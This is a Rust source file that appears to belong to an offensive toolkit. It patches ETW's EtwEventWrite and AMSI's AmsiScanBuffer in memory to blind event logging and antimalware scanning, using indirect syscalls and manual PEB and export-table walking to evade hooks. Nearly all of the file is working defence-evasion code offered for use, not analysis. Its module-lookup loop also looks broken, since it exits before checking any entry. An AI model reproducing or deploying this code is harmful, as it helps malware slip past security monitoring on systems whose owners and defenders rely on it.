#![allow(non_snake_case)]
#![allow(dead_code)]

//! # Telemetry Blinding (ETW & AMSI)
//!
//! Disables Windows persistence telemetry and antimalware scanning.
//!
//! ## Techniques
//! - **ETW Patching**: Hook `ntdll!EtwEventWrite` to return success immediately.
//! - **AMSI Bypass**: Hook `amsi!AmsiScanBuffer` to return error (forcing bypass).
//! - **Safety**: Uses `NtProtectVirtualMemory` via Indirect Syscalls to avoid hooks.

use crate::stealth::windows::syscalls::{self, Syscall};
use std::ffi::c_void;
use std::ptr;
use log::{info, error, debug};

// ============================================================================
// CONSTANTS
// ============================================================================

const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_READ: u32 = 0x20;

// x64 Payloads
#[cfg(target_arch = "x86_64")]
const RET_OPCODE: u8 = 0xC3;

#[cfg(target_arch = "x86_64")]
const XOR_RAX_RAX: [u8; 3] = [0x48, 0x31, 0xC0]; // xor rax, rax

// mov eax, 0x80070057 (E_INVALIDARG); ret
#[cfg(target_arch = "x86_64")]
const AMSI_PATCH: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];

// ============================================================================
// PUBLIC API
// ============================================================================

pub fn apply_all_blinding() {
    info!("[Blinding] Applying telemetry blinders...");
    
    if let Err(e) = patch_etw() {
        error!("[Blinding] ETW patch failed: {}", e);
    } else {
        info!("[Blinding] ETW patched (Invisible to Event Log)");
    }

    if let Err(e) = patch_amsi() {
        // AMSI might not be loaded, which is fine
        debug!("[Blinding] AMSI patch skipped/failed: {}", e);
    } else {
        info!("[Blinding] AMSI patched (Script Scanning Disabled)");
    }
}

// ============================================================================
// ETW PATCHING
// ============================================================================

fn patch_etw() -> Result<(), String> {
    // 1. Get ntdll base
    let ntdll = unsafe { get_module_handle_w(b"ntdll.dll\0") }
        .ok_or("Failed to find ntdll.dll")?;

    // 2. Resolve EtwEventWrite
    let etw_event_write = unsafe { get_proc_address(ntdll, b"EtwEventWrite\0") }
        .ok_or("Failed to find EtwEventWrite")?;

    debug!("[Blinding] EtwEventWrite at 0x{:p}", etw_event_write);

    // 3. Patch to return 0 (Success) immediately
    // x64: xor rax, rax; ret
    #[cfg(target_arch = "x86_64")]
    let payload = [0x48, 0x31, 0xC0, 0xC3]; // xor rax, rax; ret

    unsafe { write_protected_memory(etw_event_write, &payload) }
}

// ============================================================================
// AMSI PATCHING
// ============================================================================

fn patch_amsi() -> Result<(), String> {
    // 1. Get amsi.dll base (might need to load it if not present, generally mostly present if PS/CLR used)
    // We only patch if it's already there. If we load it, we might trigger events.
    let amsi = unsafe { get_module_handle_w(b"amsi.dll\0") }
        .ok_or("amsi.dll not loaded")?;

    // 2. Resolve AmsiScanBuffer
    let amsi_scan_buffer = unsafe { get_proc_address(amsi, b"AmsiScanBuffer\0") }
        .ok_or("Failed to find AmsiScanBuffer")?;

    debug!("[Blinding] AmsiScanBuffer at 0x{:p}", amsi_scan_buffer);

    // 3. Patch to return error (E_INVALIDARG)
    // E_INVALIDARG usually causes caller to assume "scan failed, open anyway" or crash gracefully
    unsafe { write_protected_memory(amsi_scan_buffer, &AMSI_PATCH) }
}

// ============================================================================
// MEMORY WRITING (Indirect Syscalls)
// ============================================================================

unsafe fn write_protected_memory(target: *mut c_void, data: &[u8]) -> Result<(), String> {
    // Resolve NtProtectVirtualMemory
    let sc_protect = Syscall::resolve(syscalls::HASH_NT_PROTECT_VIRTUAL_MEMORY)
        .ok_or("Failed to resolve NtProtectVirtualMemory")?;

    let mut base_addr = target;
    let mut region_size = data.len();
    let mut old_protect: u32 = 0;

    // 1. Change to RWX (EXECUTE_READWRITE)
    let status = syscalls::syscall(&sc_protect, &[
        -1 as isize as usize, // ProcessHandle (Current)
        &mut base_addr as *mut _ as usize, // BaseAddress (In/Out)
        &mut region_size as *mut _ as usize, // RegionSize (In/Out)
        PAGE_EXECUTE_READWRITE as usize,
        &mut old_protect as *mut _ as usize,
    ]);

    if status != 0 {
        return Err(format!("NtProtect (RWX) failed: 0x{:X}", status));
    }

    // 2. Write payload
    // Using ptr::copy_nonoverlapping instead of NtWriteVirtualMemory (since it's our own process)
    ptr::copy_nonoverlapping(data.as_ptr(), target as *mut u8, data.len());

    // 3. Restore protections
    let mut region_size = data.len();
    let mut temp_old: u32 = 0;
    
    // Restore to old_protect (usually RX)
    let _ = syscalls::syscall(&sc_protect, &[
        -1 as isize as usize,
        &mut base_addr as *mut _ as usize,
        &mut region_size as *mut _ as usize,
        old_protect as usize,
        &mut temp_old as *mut _ as usize,
    ]);

    Ok(())
}

// ============================================================================
// HELPERS (PE PARSING)
// ============================================================================

// Minimal replacement for GetModuleHandle/GetProcAddress to avoid Imports
// This uses PEB walking implemented similar to syscalls.rs but for any module

#[cfg(target_arch = "x86_64")]
unsafe fn get_module_handle_w(name: &[u8]) -> Option<*mut c_void> {
    // PEB walking to find module
    let peb: *const u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));

    let ldr = *(peb.add(0x18) as *const *const u8);
    let mut entry = *(ldr.add(0x10) as *const *const u8); // InLoadOrderModuleList
    let head = entry;

    while !entry.is_null() && entry != head {
        let base_dll = *((entry.add(0x30)) as *const *mut c_void);
        let base_name_ptr = *((entry.add(0x58 + 0x08)) as *const *const u16); // BaseDllName.Buffer
        let base_name_len = *((entry.add(0x58)) as *const u16); // BaseDllName.Length

        if !base_name_ptr.is_null() {
            // Simple robust comparison (case-insensitive for ASCII parts)
            let mut matches = true;
            let name_len = name.len().saturating_sub(1); // ignore null terminator in search
            
            // Name in structure is UTF-16, input is UTF-8/ASCII
            if (base_name_len as usize / 2) < name_len {
                matches = false;
            } else {
                for i in 0..name_len {
                    let c_mod = *base_name_ptr.add(i);
                    let c_target = name[i] as u16;
                    
                    // Lowercase compare
                    let c_mod_lower = if c_mod >= 65 && c_mod <= 90 { c_mod + 32 } else { c_mod };
                    let c_target_lower = if c_target >= 65 && c_target <= 90 { c_target + 32 } else { c_target };
                    
                    if c_mod_lower != c_target_lower {
                        matches = false;
                        break;
                    }
                }
            }

            if matches {
                return Some(base_dll);
            }
        }

        entry = *entry;
    }
    None
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn get_module_handle_w(_name: &[u8]) -> Option<*mut c_void> { None }

// Manual GetProcAddress
unsafe fn get_proc_address(module: *mut c_void, name: &[u8]) -> Option<*mut c_void> {
    let dos = module as *const u8;
    let e_lfanew = *((dos.add(0x3C)) as *const i32);
    let nt = dos.add(e_lfanew as usize);
    
    // OptionalHeader + DataDirectory[0] (Export)
    // Magic check skipped for brevity (assumed valid module)
    let export_rva = *((nt.add(0x18 + 0x70)) as *const u32);
    if export_rva == 0 { return None; }
    
    let export = dos.add(export_rva as usize);
    let num_names = *((export.add(0x18)) as *const u32);
    let names_rva = *((export.add(0x20)) as *const u32);
    let funcs_rva = *((export.add(0x1C)) as *const u32);
    let ords_rva = *((export.add(0x24)) as *const u32);
    
    let names = dos.add(names_rva as usize) as *const u32;
    let funcs = dos.add(funcs_rva as usize) as *const u32;
    let ords = dos.add(ords_rva as usize) as *const u16;
    
    for i in 0..num_names {
        let name_ptr = dos.add(*names.add(i as usize) as usize);
        
        // StrCmp
        let mut j = 0;
        let mut found = true;
        while name[j] != 0 {
            if *name_ptr.add(j) != name[j] {
                found = false;
                break;
            }
            j += 1;
        }
        
        if found && *name_ptr.add(j) == 0 {
            let ordinal = *ords.add(i as usize);
            let func_rva = *funcs.add(ordinal as usize);
            return Some(module.add(func_rva as usize));
        }
    }
    
    None
}
